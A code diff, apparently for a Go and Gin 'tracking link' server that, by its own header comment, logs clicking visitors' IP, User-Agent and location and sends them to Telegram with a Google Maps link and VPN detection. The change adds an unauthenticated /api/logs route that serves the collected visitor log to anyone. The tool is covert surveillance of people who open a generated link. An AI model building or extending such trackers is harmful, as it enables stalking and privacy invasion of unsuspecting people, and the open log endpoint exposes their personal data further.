@@ -1,9 +1,13 @@
+// BACKEND (Go + Gin + Telegram)
+// Tracks visitors' IP, User-Agent & location, logs them, and sends Telegram notification with Google Maps link and VPN detection
+
 package main
 
 import (
 	"bytes"
 	"encoding/json"
 	"fmt"
+	"io/ioutil"
 	"math/rand"
 	"net/http"
 	"os"
@@ -101,6 +105,15 @@ func trackDeepData(c *gin.Context) {
 	c.JSON(http.StatusOK, gin.H{"status": "tracked"})
 }
 
+func viewLogs(c *gin.Context) {
+	logData, err := ioutil.ReadFile("log.txt")
+	if err != nil {
+		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read log file"})
+		return
+	}
+	c.Data(http.StatusOK, "text/plain; charset=utf-8", logData)
+}
+
 func redirectHandler(c *gin.Context) {
 	id := c.Param("id")
 	_, exists := linkStore[id]
@@ -128,6 +141,7 @@ func main() {
 
 	r.POST("/api/generate", generateLink)
 	r.POST("/api/track", trackDeepData)
+	r.GET("/api/logs", viewLogs)
 	r.GET("/t/:id", redirectHandler)
 
 	fmt.Println("Server started at http://0.0.0.0:8080")
